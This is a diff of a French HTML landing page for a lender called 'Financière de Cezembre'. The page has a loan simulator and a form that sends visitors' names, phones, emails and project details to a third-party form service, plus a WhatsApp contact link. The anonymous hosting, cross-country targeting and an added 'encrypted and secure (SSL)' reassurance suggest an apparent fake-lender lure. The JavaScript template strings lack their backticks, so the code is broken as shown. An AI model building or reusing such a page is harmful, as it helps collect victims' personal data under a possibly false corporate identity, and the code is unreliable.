@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FINANCIÈRE DE CEZEMBRE | Solutions de Crédit Institutionnelles</title>
+    <title>FINANCIÈRE DE CEZEMBRE | Solutions de Crédit</title>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     
@@ -12,50 +12,55 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
         body { background-color: var(--white); color: #333; overflow-x: hidden; }
 
-        /* HEADER & PAYS */
+        /* HEADER */
         header {
             background: var(--white); padding: 20px 8%; display: flex;
             justify-content: space-between; align-items: center;
             position: fixed; width: 100%; z-index: 1000; box-shadow: 0 4px 12px rgba(0,0,0,0.05);
         }
-        .logo { font-weight: 700; font-size: 1.4rem; color: var(--navy); letter-spacing: -1px; }
+        .logo { font-weight: 700; font-size: 1.4rem; color: var(--navy); }
+
+        /* LANGUES AVEC DRAPEAUX */
         .lang-switcher { display: flex; align-items: center; gap: 8px; background: #EEE; padding: 8px 12px; border-radius: 4px; }
         .lang-switcher img { width: 20px; height: 14px; object-fit: cover; border-radius: 2px; }
         .lang-switcher select { border: none; background: transparent; font-weight: 700; font-size: 0.8rem; cursor: pointer; outline: none; }
 
-        /* HERO & SIMULATEUR */
+        /* HERO (ARRIERE-PLAN D'ORIGINE) */
         .hero {
             height: 100vh; background: linear-gradient(rgba(0,26,77,0.7), rgba(0,26,77,0.7)), 
             url('https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&q=80&w=2000');
             background-size: cover; background-position: center;
             display: flex; align-items: center; padding: 0 8%; color: var(--white);
         }
+
+        /* SIMULATEUR */
         .simulator {
             background: var(--white); padding: 40px; border-radius: 2px; width: 480px;
             box-shadow: 0 30px 60px rgba(0,0,0,0.4); color: var(--navy); margin-left: auto;
         }
         .sim-row { margin-bottom: 25px; }
-        input[type="range"] { width: 100%; height: 6px; accent-color: var(--gold); cursor: pointer; }
+        input[type="range"] { width: 100%; height: 6px; accent-color: var(--gold); cursor: pointer; -webkit-appearance: none; background: #ddd; border-radius: 5px; }
+        input[type="range"]::-webkit-slider-thumb { -webkit-appearance: none; height: 18px; width: 18px; border-radius: 50%; background: var(--gold); cursor: pointer; }
+        
         .result-area { background: var(--light-bg); padding: 25px; text-align: center; border: 1px solid #EEE; margin-bottom: 20px; }
         .result-area span { font-size: 2.2rem; font-weight: 700; color: var(--navy); }
-        .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
-        .btn-main:hover { background: var(--gold); }
+        .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; cursor: pointer; transition: 0.3s; }
 
-        /* BARRE SOCIALE & WHATSAPP */
-        .social-bar { position: fixed; bottom: 25px; left: 25px; display: flex; align-items: center; gap: 12px; z-index: 5000; }
-        .social-item { width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; text-decoration: none; font-size: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); transition: 0.3s; }
-        .social-item.wa { background: var(--whatsapp); width: 60px; height: 60px; font-size: 32px; }
-        .social-item.fb { background: #1877F2; }
-        .social-item.ln { background: #0077B5; }
-        .social-item:hover { transform: scale(1.1); }
+        /* BOUTONS SOCIAUX ET WHATSAPP EN BAS */
+        .social-share-bar { position: fixed; bottom: 25px; left: 25px; display: flex; align-items: center; gap: 12px; z-index: 5000; }
+        .share-icon { width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; text-decoration: none; font-size: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        .wa { background: var(--whatsapp); width: 60px; height: 60px; font-size: 32px; }
+        .fb { background: #1877F2; }
+        .ln { background: #0077B5; }
 
         /* MODALE */
         #modalForm { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 6000; justify-content: center; align-items: center; padding: 20px; }
         .modal-content { background: white; padding: 35px; width: 100%; max-width: 500px; border-radius: 4px; position: relative; }
-        .modal-content input, .modal-content textarea, .modal-content select { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 0.9rem; }
+        .modal-content input, .modal-content textarea, .modal-content select { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ddd; }
         .close-btn { position: absolute; top: 15px; right: 20px; font-size: 1.5rem; cursor: pointer; color: #999; }
+        .security-note { font-size: 0.75rem; color: #666; text-align: center; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 5px; }
 
-        footer { background: #0A0A0A; color: #666; padding: 30px 8%; text-align: center; font-size: 0.75rem; }
+        footer { background: #0A0A0A; color: #666; padding: 30px 8%; text-align: center; font-size: 0.8rem; }
     </style>
 </head>
 <body>
@@ -64,16 +69,17 @@
     <div class="logo">FINANCIÈRE DE CEZEMBRE</div>
     <div class="lang-switcher">
         <img id="activeFlag" src="https://flagcdn.com/w40/fr.png">
-        <select onchange="updateFlag(this)">
+        <select onchange="updateLang(this)">
             <option value="fr" data-flag="fr">FRANCE (FR)</option>
+            <option value="es" data-flag="es">ESPAÑA (ES)</option>
+            <option value="de" data-flag="de">DEUTSCHLAND (DE)</option>
+            <option value="it" data-flag="it">ITALIA (IT)</option>
+            <option value="gb" data-flag="gb">UK (EN)</option>
             <option value="gr" data-flag="gr">GRÈCE (GR)</option>
             <option value="se" data-flag="se">SUÈDE (SE)</option>
             <option value="sk" data-flag="sk">SLOVAQUIE (SK)</option>
             <option value="si" data-flag="si">SLOVÉNIE (SI)</option>
             <option value="xk" data-flag="xk">KOSOVO (XK)</option>
-            <option value="it" data-flag="it">ITALIA (IT)</option>
-            <option value="es" data-flag="es">ESPAÑA (ES)</option>
-            <option value="de" data-flag="de">DEUTSCHLAND (DE)</option>
         </select>
     </div>
 </header>
@@ -85,56 +91,57 @@
     </div>
 
     <div class="simulator">
-        <h3 style="text-align: center; margin-bottom: 25px; letter-spacing: 1px;">SIMULATEUR DE CRÉDIT</h3>
+        <h3 style="text-align: center; margin-bottom: 20px;">SIMULATEUR DE CRÉDIT</h3>
         <div class="sim-row">
-            <label style="display:flex; justify-content:space-between; font-weight:600; font-size:0.85rem;">MONTANT DU PRÊT : <span><span id="amtV">15000</span> €</span></label>
+            <label style="display:flex; justify-content:space-between; font-weight:600;">MONTANT : <span><span id="amtV">15000</span> €</span></label>
             <input type="range" id="amt" min="1000" max="100000" step="500" value="15000">
         </div>
         <div class="sim-row">
-            <label style="display:flex; justify-content:space-between; font-weight:600; font-size:0.85rem;">DURÉE : <span><span id="durV">24</span> MOIS</span></label>
+            <label style="display:flex; justify-content:space-between; font-weight:600;">DURÉE : <span><span id="durV">24</span> MOIS</span></label>
             <input type="range" id="dur" min="6" max="120" step="6" value="24">
         </div>
         <div class="result-area">
-            <small style="font-weight:700; color:#888;">MENSUALITÉ ESTIMÉE (TAEG 3.5%)</small><br>
+            <small>MENSUALITÉ FIXE (TAEG 3.5%)</small><br>
             <span id="res">0.00</span> €
         </div>
-        <button class="btn-main" onclick="openForm()">Déposer mon dossier</button>
+        <button class="btn-main" onclick="openForm()">DÉPOSER MON DOSSIER</button>
     </div>
 </section>
 
 <div id="modalForm">
     <div class="modal-content">
         <span class="close-btn" onclick="closeForm()">&times;</span>
-        <h2 style="margin-bottom: 20px; color: var(--navy); text-align:center;">Dossier de Financement</h2>
+        <h2 style="margin-bottom: 20px; color: var(--navy); text-align:center;">Nouveau Dossier</h2>
         <form action="https://api.web3forms.com/submit" method="POST">
             <input type="hidden" name="access_key" value="55707e6c-f919-4972-bf3e-fba1cf0e51e9">
-            <input type="hidden" name="simulation_result" id="hiddenData">
+            <input type="hidden" name="simulation_data" id="hiddenData">
             
-            <input type="text" name="nom_complet" placeholder="Nom et Prénom" required>
+            <input type="text" name="nom" placeholder="Nom et Prénom" required>
             <select name="projet" required>
-                <option value="">Nature du projet...</option>
-                <option value="Personnel">Prêt Personnel</option>
+                <option value="">Sélectionnez votre projet...</option>
                 <option value="Travaux">Travaux / Rénovation</option>
-                <option value="Auto">Véhicule</option>
+                <option value="Auto">Achat Véhicule</option>
+                <option value="Perso">Prêt Personnel</option>
                 <option value="Immo">Immobilier</option>
             </select>
-            <textarea name="description" placeholder="Décrivez votre besoin..." rows="3" required></textarea>
+            <textarea name="details" placeholder="Décrivez votre projet..." rows="3" required></textarea>
             <input type="tel" name="phone" placeholder="Téléphone" required>
             <input type="email" name="email" placeholder="Adresse Email" required>
             
-            <button type="submit" class="btn-main">Soumettre ma demande</button>
+            <button type="submit" class="btn-main">ENVOYER LA DEMANDE</button>
+            <div class="security-note"><i class="fas fa-lock" style="color:var(--gold)"></i> Données cryptées et sécurisées (SSL)</div>
         </form>
     </div>
 </div>
 
-<div class="social-bar">
-    <a href="https://wa.me/33780976404" class="social-item wa" target="_blank"><i class="fab fa-whatsapp"></i></a>
-    <a href="https://www.facebook.com/sharer/sharer.php?u=https://p2p-finance-pro.vercel.app" class="social-item fb" target="_blank" title="Partager sur Facebook"><i class="fab fa-facebook-f"></i></a>
-    <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://p2p-finance-pro.vercel.app" class="social-item ln" target="_blank" title="Partager sur LinkedIn"><i class="fab fa-linkedin-in"></i></a>
+<div class="social-share-bar">
+    <a href="https://wa.me/33780976404" class="share-icon wa" target="_blank"><i class="fab fa-whatsapp"></i></a>
+    <a href="https://www.facebook.com/sharer/sharer.php?u=https://votre-lien-site.com" class="share-icon fb" target="_blank"><i class="fab fa-facebook-f"></i></a>
+    <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://votre-lien-site.com" class="share-icon ln" target="_blank"><i class="fab fa-linkedin-in"></i></a>
 </div>
 
 <footer>
-    <p><strong>FINANCIÈRE DE CEZEMBRE SA</strong> | Capital 1 200 000 € | RCS Quimper 552 058 943</p>
+    <p><strong>FINANCIÈRE DE CEZEMBRE SA</strong> | RCS Quimper 552 058 943</p>
 </footer>
 
 <script>
@@ -142,7 +149,7 @@
     const dur = document.getElementById('dur');
     const res = document.getElementById('res');
 
-    function updateFlag(sel) {
+    function updateLang(sel) {
         const flag = sel.options[sel.selectedIndex].getAttribute('data-flag');
         document.getElementById('activeFlag').src = https://flagcdn.com/w40/${flag}.png;
     }
@@ -152,17 +159,16 @@
         let n = parseInt(dur.value);
         document.getElementById('amtV').innerText = p.toLocaleString();
         document.getElementById('durV').innerText = n;
-        
         let r = 0.035 / 12;
         let m = (p * r) / (1 - Math.pow(1 + r, -n));
         res.innerText = m.toFixed(2);
-        
         document.getElementById('hiddenData').value = Montant: ${p}€ | Durée: ${n} mois | Mensualité: ${m.toFixed(2)}€;
     }
 
     function openForm() { document.getElementById('modalForm').style.display = 'flex'; }
     function closeForm() { document.getElementById('modalForm').style.display = 'none'; }
 
+    // Les curseurs sont maintenant actifs et débloqués
     amt.oninput = calculate;
     dur.oninput = calculate;
     calculate();
